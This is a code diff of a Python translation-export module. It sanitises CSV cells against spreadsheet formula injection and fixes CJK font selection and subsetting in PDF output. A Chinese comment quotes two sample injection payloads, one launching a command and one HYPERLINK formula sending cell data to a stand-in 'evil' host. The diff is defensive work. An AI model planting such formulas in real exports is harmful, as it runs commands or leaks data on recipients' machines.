@@ -883,7 +883,13 @@ def _build_csv(pairs: list[dict]) -> bytes:
     w = _csv.writer(buf, quoting=_csv.QUOTE_MINIMAL)
     w.writerow(["source", "target"])
     for p in pairs:
-        w.writerow([p.get("source", ""), p.get("target", "")])
+        # **一定要走 `csv_safe.row()`**。`source` 欄的內容來自使用者上傳的
+        # 文件 —— 也就是**別人寄來的** PDF / Word，內容完全不受控。開頭是
+        # `=` `+` `-` `@` 的儲存格在 Excel 裡會被當成公式執行
+        # （`=cmd|'/c calc'!A1`、`=HYPERLINK("http://evil/?d="&A1,"點我")`）。
+        # 同一支檔案的 xlsx 匯出早就做對了，只有 CSV 這條漏掉
+        # （v1.14.31 對抗式驗證實測，走真正的 HTTP 端點打出兩列未中和的公式）。
+        w.writerow(_csv_safe.row([p.get("source", ""), p.get("target", "")]))
     return b"\xef\xbb\xbf" + buf.getvalue().encode("utf-8")
 
 
@@ -1074,15 +1080,30 @@ def _build_pdf(pairs: list[dict], meta: dict) -> bytes:
     except Exception:
         pass
     font_alias = "cjk"
+    # 這份 PDF 會用到的所有字，在這裡就全部知道了 —— 交給 `embeddable_font`
+    # 才能①挑到 `.ttc` 的**繁中**子字型②只嵌用到的字。
+    #
+    # **原本這兩件事都沒做到**（v1.14.31 對抗式驗證抓到）：舊寫法是
+    # `fontfile=str(path)` 加 `set_simple=False`，註解還寫著「PyMuPDF
+    # insert_font 支援 TTC 指定 face index」—— **那句話是錯的**，PyMuPDF 的
+    # 公開 API 完全沒有 ttc 索引參數，`fontfile` 一律用第 0 套。而 Linux 的
+    # `NotoSansCJK-Regular.ttc` 第 0 套是**日文**（繁中在第 3 套），所以整份
+    # 對照 PDF 的中文都是日文字形（每/毎、過、者 寫法不同）；`idx` 只被拿去
+    # 設 `set_simple`，根本沒傳下去。同時因為沒給 `text=`，整支 16 MB 字型
+    # 原封不動嵌進去 —— 實測產出 13,406 KB。CLAUDE.md 記過這個雷兩次
+    # （v1.11.40、v1.14.19），這一處是漏網的。
+    _all_text = "逐句翻譯對照原文譯文" + "".join(
+        (p.get("source") or "") + (p.get("target") or "") for p in pairs)
+    _all_text += "".join(_meta_lines({**meta, "count": len(pairs)}))
+
     def _register(p):
         nonlocal font_alias
         if cjk_font_path:
             try:
-                # PyMuPDF insert_font 支援 TTC 指定 face index
-                kwargs = {"fontname": font_alias, "fontfile": str(cjk_font_path)}
-                if cjk_ttc_idx:
-                    kwargs["set_simple"] = False  # CJK 用 CID 字型
-                p.insert_font(**kwargs)
+                fontfile, fontbuffer = font_catalog.embeddable_font(
+                    cjk_font_path, cjk_ttc_idx, text=_all_text)
+                p.insert_font(fontname=font_alias, fontfile=fontfile,
+                              fontbuffer=fontbuffer)
                 return
             except Exception:
                 pass
